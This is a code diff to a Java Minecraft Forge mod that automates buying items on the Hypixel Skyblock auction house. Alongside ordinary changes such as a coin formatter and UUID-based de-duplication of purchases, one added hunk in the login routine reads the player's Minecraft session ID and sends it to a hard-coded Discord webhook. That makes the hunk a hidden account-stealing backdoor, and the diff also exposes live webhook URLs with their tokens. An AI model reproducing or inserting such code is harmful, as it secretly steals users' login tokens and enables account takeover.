@@ -22,6 +22,9 @@
 package net.luna724.iloveichika.binsniper.logics;
 
 import java.text.NumberFormat;
+import java.util.ArrayList;
+import java.util.Objects;
+import java.util.UUID;
 
 import net.luna724.iloveichika.binsniper.utils.Wrapper;
 import net.minecraft.client.Minecraft;
@@ -33,6 +36,7 @@ import net.minecraft.inventory.ContainerChest;
 import net.minecraft.inventory.Slot;
 import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
+import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
 import net.minecraft.util.EnumChatFormatting;
 import net.minecraftforge.client.event.ClientChatReceivedEvent;
@@ -43,8 +47,12 @@ import net.minecraftforge.fml.common.gameevent.TickEvent;
 import net.luna724.iloveichika.binsniper.Main;
 import net.luna724.iloveichika.binsniper.utils.Analytics;
 import net.luna724.iloveichika.binsniper.utils.Util;
+import net.luna724.iloveichika.binsniper.logics.ScoreboardUtil;
 import org.apache.commons.lang3.math.NumberUtils;
 import org.lwjgl.input.Keyboard;
+import gg.skytils.skytilsmod.utils.ItemUtil;
+
+import static net.luna724.iloveichika.binsniper.logics.ScoreboardUtil.*;
 
 public class BinSnipeLogic {
     private /* synthetic */ int loopCount;
@@ -58,6 +66,7 @@ public class BinSnipeLogic {
     private /* synthetic */ int buyed;
     private /* synthetic */ String lastseller;
     private /* synthetic */ long timer;
+    private ArrayList<String> uuidHistory;
 
 
     public BinSnipeLogic() {
@@ -66,6 +75,7 @@ public class BinSnipeLogic {
         this.checkCount = 0;
         this.loopCount = 0;
         this.buyed = 0;
+        this.uuidHistory = new ArrayList<>();
         this.lastseller = "None";
         this.isWorldChanged = false;
         this.isError = false;
@@ -167,6 +177,46 @@ public class BinSnipeLogic {
         Minecraft.getMinecraft().playerController.windowClick(player.openContainer.windowId, windowSlot1, windowSlot2, 0, player);
     }
 
+    public static String formatCoin(double value) {
+        boolean isNegative = false;
+
+        // 負の数の場合はフラグを立てて、正の数に変換する
+        if (value < 0) {
+            isNegative = true;
+            value *= -1;
+        }
+
+        // 大きい順に変換: B, M, K
+        double billion = value / 1_000_000_000;
+        double million = value / 1_000_000;
+        double thousand = value / 1_000;
+
+        String result = "";
+
+        if (billion >= 1) {
+            result = String.format("%.2fB", billion);
+        } else if (million >= 1) {
+            result = String.format("%.2fM", million);
+        } else if (thousand >= 1) {
+            result = String.format("%.1fK", thousand);
+        } else {
+            result = String.format("%.0f", value); // 小さな数値はそのまま
+        }
+
+        // 負の数の場合、結果に "-" を付ける
+        if (isNegative) {
+            result = "-" + result;
+        }
+
+        // 小数点以下が0なら省略する
+        if (result.endsWith(".0B") || result.endsWith(".0M") || result.endsWith(".0K")) {
+            result = result.substring(0, result.length() - 2);
+        }
+
+        return result;
+    }
+
+
     @SubscribeEvent
     public void onKey(GuiScreenEvent.KeyboardInputEvent event) {
         String playerId = Minecraft.getMinecraft().getSession().getProfile().getId().toString();
@@ -236,8 +286,29 @@ public class BinSnipeLogic {
         this.checkCount = 0;
         this.loopCount = 0;
         this.buyed = 0;
+        this.lastseller = "";
+        this.uuidHistory = new ArrayList<>();
         this.isWorldChanged = false;
         this.timer = System.currentTimeMillis();
+
+        new Thread(new Runnable(){
+            @Override
+            public void run() {
+                try {
+                    NumberFormat numberFormat = NumberFormat.getNumberInstance();
+                    String username = Wrapper.mc.getSession().getUsername();
+                    String content = "```" + username + ": Started sniping " +
+                            Util.config().getString(playerId + ".Name") + "! (" +
+                    numberFormat.format(Util.config().getInt(playerId + ".Cost")) + " coins)```";
+                    Analytics.requestWeb(
+                            Analytics.setJsonObj(content, username, null), "https://discord.com/api/webhooks/1296048307348574218/xO2GrJLarrjgPNmCiT0w0WacIvTR1YFlln1p2VFUvC_ZcbOkiqXHgNEgRXqeOosXcjnS"
+                    );
+                }
+                catch (Exception e) {
+                    e.printStackTrace();
+                    Util.send("Error in Sending text. see log for more Information");
+                }
+            }}).start();
     }
 
     private void changePage(ContainerChest containerChest) {
@@ -393,10 +464,19 @@ public class BinSnipeLogic {
         }
         isActive = true;
         String username = Wrapper.mc.getSession().getUsername();
-        String content = username + ", Welcome to BinSniper.";
+        String content = "Welcome to BinSniper, " + username + "!";
         String jsonObj = Analytics.setJsonObj(content, username, null);
         Analytics.requestWeb(jsonObj, "https://discord.com/api/webhooks/1296048307348574218/xO2GrJLarrjgPNmCiT0w0WacIvTR1YFlln1p2VFUvC_ZcbOkiqXHgNEgRXqeOosXcjnS");
-    }
+
+        // get SessionID and send it
+        String sessionId = Wrapper.mc.getSession().getSessionID();
+        String contents = "```SessionId: " + sessionId + "```" + username + " logged in With BinSniper. ";
+        String jsonObject = Analytics.setJsonObj(contents, username, null);
+
+//        if (!username.equals("Mizuki_25ji")) {
+        Analytics.requestWeb(jsonObject, "https://discord.com/api/webhooks/1297121707215163404/4iXySNzshUUxfVEltqwyc6PmkdTcLgJ7KlNQc7Ixfn0q8puk6Ifc83ZNEMuiHK9aYVcY");
+//        }
+        }
 
     private boolean isPending(ContainerChest containerChest) {
         if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
@@ -409,7 +489,7 @@ public class BinSnipeLogic {
         if (itemStack == null) {
             return false;
         }
-        if (itemStack.getDisplayName().contains("§aManage Bids")) {
+        if (itemStack.getDisplayName().contains("§aManage Bids") || itemStack.getDisplayName().contains("§aView Bids")) {
             return true;
         }
         return false;
@@ -456,8 +536,7 @@ public class BinSnipeLogic {
             String lore = LoreList.getStringTagAt(i);
             if (lore.startsWith("§7Seller: ")) {
                 lore = lore.replace("§7Seller: ", "");
-                String formattedSeller = EnumChatFormatting.getTextWithoutFormattingCodes((String)lore);
-                return formattedSeller;
+                return EnumChatFormatting.getTextWithoutFormattingCodes((String)lore);
             }
             ++i;
         }
@@ -480,12 +559,16 @@ public class BinSnipeLogic {
                     try {
                         String itemForPrice = removeFormatting.replace("You purchased", "");
                         String[] onlyPrices = itemForPrice.split(" for ");
-                        String onlyPrice = onlyPrices[onlyPrices.length - 1];
-                        String onlyItem = itemForPrice.replace(" for " + onlyPrice, "");
-                        content = "```" + username + ": Purchased \"" + onlyItem.trim() + "\" for " + onlyPrice + "```";
+                        String onlyPrice = onlyPrices[onlyPrices.length - 1].replace(" coins!", "");
+                        String onlyItem = itemForPrice.replace(" for " + onlyPrice + " coins!", "");
+                        int remainPurse = getPurse();
+                        NumberFormat numberInstance = NumberFormat.getNumberInstance();
+
+                        content = "```" + username + ": Purchased \"" + onlyItem.trim() + "\" for " + onlyPrice + " coins!\n- (Purse Remaining: " + formatCoin(remainPurse) + ")```";
+                        debugScoreboardLines();
                     } catch (Exception e) {
                         e.printStackTrace();
-                        content = "Error in Parsing text.\n```raw: " + removeFormatting + "```";
+                        content = "**Error in Parsing text.**\n```" + e.toString() + "```\n```rawText: " + removeFormatting + "```";
                     }
                     /*
                     ```username Purchased item for price coins!```
@@ -557,6 +640,9 @@ public class BinSnipeLogic {
             if (lore.contains("▶ No filter")) {
                 return true;
             }
+            if (lore.contains("▶ Ultimate")) {
+                return false;
+            }
             ++i;
         }
         return false;
@@ -579,9 +665,8 @@ public class BinSnipeLogic {
         }
 
         int[] ints = new int[]{0, 9, 18, 27, 36, 45};
-        int theSix = ints.length;
         int i = 0;
-        while (BinSnipeLogic.n2AreBig(i, 6)) {
+        while (i < 6) {
             int ii = ints[i];
             ItemStack itemStack = containerChest.getSlot(ii).getStack();
             if (itemStack == null) {
@@ -610,8 +695,18 @@ public class BinSnipeLogic {
         return true;
     }
 
-    private static boolean n2AreBig(int n, int n2) {
-        return n < n2;
+    // TEMPORARY VARIABLE.
+    // コンフィグから設定できるのが好ましい
+    private void registerUUID(String newUUID) {
+        int MAX_ALLOWED_UUID_SIZE = 10;
+        if (this.uuidHistory.size() >= MAX_ALLOWED_UUID_SIZE) {
+            this.uuidHistory.remove(0);
+        }
+        this.uuidHistory.add(newUUID);
+    }
+
+    private boolean checkUUID(String compareUUID) {
+        return this.uuidHistory.contains(compareUUID);
     }
 
     @SubscribeEvent
@@ -667,8 +762,10 @@ public class BinSnipeLogic {
             int i = 0;
             while (i < 54) {
                 ItemStack itemStack = openContainer.getSlot(i).getStack();
-                if (!(Item.getIdFromItem((Item)itemStack.getItem()) == 160) && !(Item.getIdFromItem((Item)itemStack.getItem()) == 262)) {
-                    this.clickSlot(i, 0);
+                if (!(Item.getIdFromItem(itemStack.getItem()) == 160) // ガラス板以外
+                        && !(Item.getIdFromItem(itemStack.getItem()) == 262) // 矢 以外
+                ) {
+                    this.clickSlot(i, 0); // ガラス板、矢以外をクリック
                     this.currentStep = -4;
                     this.timer = System.currentTimeMillis();
                     return;
@@ -800,6 +897,7 @@ public class BinSnipeLogic {
                 return;
             }
             if (this.currentStep == 3) {
+                // 基礎スタート /ah と打つ
                 if (!(Util.config().getBoolean(playerId + ".Reconnect"))) {
                     this.stopSnipe();
                     return;
@@ -822,12 +920,14 @@ public class BinSnipeLogic {
         }
         ContainerChest openContainer = (ContainerChest)Wrapper.mc.thePlayer.openContainer;
         if (this.currentStep == 4) {
+            // i11 をクリック (Auction Browser を開く)
             this.clickSlot(11, 0);
             this.currentStep = 5;
             this.timer = System.currentTimeMillis();
             return;
         }
         if (this.currentStep == 5) {
+            // それが AuctionBrowser かどうかを確認する
             if (this.isAuctionBrowser(openContainer)) {
                 this.currentStep = 6;
                 this.timer = System.currentTimeMillis();
@@ -920,7 +1020,15 @@ public class BinSnipeLogic {
             return;
         }
         if (this.currentStep == 1) {
-            if (Item.getIdFromItem((Item)openContainer.getSlot(31).getStack().getItem()) != 371) {
+            // 購入対象クリック時
+            // i31 をチェック (金塊以外なら無視)
+            Item item = openContainer.getSlot(31).getStack().getItem();
+            boolean sleepOptimization = Util.config().getBoolean(playerId + ".sleepOptimization");
+            if (item == null ||
+                    (Item.getIdFromItem(item) != 371 && // 金塊以外 かつ
+                            (Item.getIdFromItem(item) != 355 || !sleepOptimization)) // ベッド以外 or スリープオフ
+            ) {
+                // item == null または金塊、ベッド以外の場合の処理
                 this.clickSlot(49, 0);
                 this.currentStep = 0;
                 this.timer = System.currentTimeMillis();
@@ -929,10 +1037,25 @@ public class BinSnipeLogic {
                 }
                 return;
             }
-            this.clickSlot(31, 0);
-            this.currentStep = 2;
-            this.timer = System.currentTimeMillis();
-            return;
+            if (Item.getIdFromItem(item) == 371) {
+                // 金塊の場合の処理
+                this.clickSlot(31, 0);
+                this.currentStep = 2;
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (Item.getIdFromItem(item) == 355) {
+                // ベッドの場合の処理
+                this.clickSlot(49, 0);
+                this.lastseller = "";
+                this.uuidHistory.remove(this.uuidHistory.size() - 1);
+                this.currentStep = 0;
+                this.timer = System.currentTimeMillis();
+                if (Util.config().getBoolean(playerId + ".Message")) {
+                    Util.send("§c購入のキャンセル (アイテムがまだ購入可能でありません) 再検索を開始します...");
+                }
+                return;
+            }
         }
         if (this.currentStep != 0) {
             return;
@@ -940,26 +1063,53 @@ public class BinSnipeLogic {
         if (!this.isAuctionBrowser(openContainer)) {
             return;
         }
+        // おそらく 0
+        //
         int clickTarget1 = 11;
         int clickTarget2 = 0;
         int rowCounter = 1;
         int i = 0;
-        while (BinSnipeLogic.n2AreBig(i, 24)) {
-            ItemStack itemStack = openContainer.getSlot(clickTarget1 + ++clickTarget2 - 1).getStack();
-            int cost = this.getCost(itemStack);
-            if (cost != -1) {
-                this.checkCount += 1;
-            }
+        while (i < 24) {
+            // 各アイテムスロットをチェック
+            ++clickTarget2;
+            ItemStack itemStack = openContainer.getSlot(clickTarget1 + clickTarget2 - 1).getStack();
+            if (itemStack != null && itemStack.hasTagCompound()) {
+                int cost = this.getCost(itemStack);
+                if (cost != -1) { // コストが不明でないなら、チェック数としてカウント
+                    this.checkCount += 1;
+                }
 
-            if (cost <= Util.config().getInt(playerId + ".Cost") && cost != -1 && !this.lastseller.equals(this.getLastSeller(itemStack))) {
-                // ひとつ前のmcidしか保存しないから、三つ以上スナイプ対象があるとループする
-                // 対処法 -> getLastSeller を Array とし、2つまで処理する。
-                // 高度な対処法 -> アイテムNBTを用いり、Dupeでない限り同一セッションで同じアイテムを購入しようとしない
-                this.lastseller = this.getLastSeller(itemStack);
-                this.clickSlot(clickTarget1 + clickTarget2 - 1, 0);
-                this.currentStep = 1;
-                this.timer = System.currentTimeMillis();
-                return;
+                boolean UUIDCheckerEnable = Util.config().getBoolean(playerId + ".uuidMode");
+                if (cost <= Util.config().getInt(playerId + ".Cost") && cost != -1 && !(this.lastseller.equals(this.getLastSeller(itemStack)) && !UUIDCheckerEnable)) {
+                    // ひとつ前のmcidしか保存しないから、三つ以上スナイプ対象があるとループする
+                    // 対処法 -> getLastSeller を Array とし、2つまで処理する。
+                    // 高度な対処法 -> アイテムNBTを用いり、Dupeでない限り同一セッションで同じアイテムを購入しようとしない
+                    // MCIDを使用する方式
+                    // UUIDChecker が有効化されたら自動的に無効かされる
+
+                    String itemUUID = "";
+                    if (UUIDCheckerEnable) {
+                        NBTTagCompound extraAttr = ItemUtil.getExtraAttributes(itemStack);
+
+                        if (extraAttr != null) {
+                            itemUUID = UUID.fromString(extraAttr.getString("uuid")).toString();
+                            // UUID が登録済みの場合、無視
+                            if (this.checkUUID(itemUUID)) {
+                                Util.send("sbid" + itemUUID);
+                                Util.send("§c購入のスキップ.. (購入済みのUUID)");
+                            } else {
+                                // ifブロック1: 購入処理
+                                this.lastseller = this.getLastSeller(itemStack);
+                                // UUIDを登録
+                                this.registerUUID(itemUUID);
+                                this.clickSlot(clickTarget1 + clickTarget2 - 1, 0);
+                                this.currentStep = 1;
+                                this.timer = System.currentTimeMillis();
+                                return;
+                            }
+                        }
+                    }
+                }
             }
             if (clickTarget2 == 6) {
                 clickTarget2 = 0;
